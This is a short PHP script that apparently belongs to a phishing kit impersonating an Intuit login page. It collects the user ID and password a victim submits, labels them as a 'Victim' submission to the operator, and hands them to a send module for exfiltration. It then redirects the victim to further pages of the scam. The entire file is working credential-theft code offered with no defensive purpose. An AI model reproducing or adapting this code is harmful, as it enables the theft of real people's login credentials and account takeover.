<?php
require_once('./Module/Setmodule.php');
$message .= "|Wassup, $yourname|| #Victim Submited REL0G!N to your INTUIT page \n"."\n";
$message .= "|User ID: ".$_POST['userid']."\n"; 
$message .= "|Password: ".$_POST['password']."\n\n"; 
require_once('Module/SendModule.php');


  

	
if($settings['Shownum'] == "1"){
	header("Location: ../num.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
    
  else{
	header("Location: ../main.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  
  
?>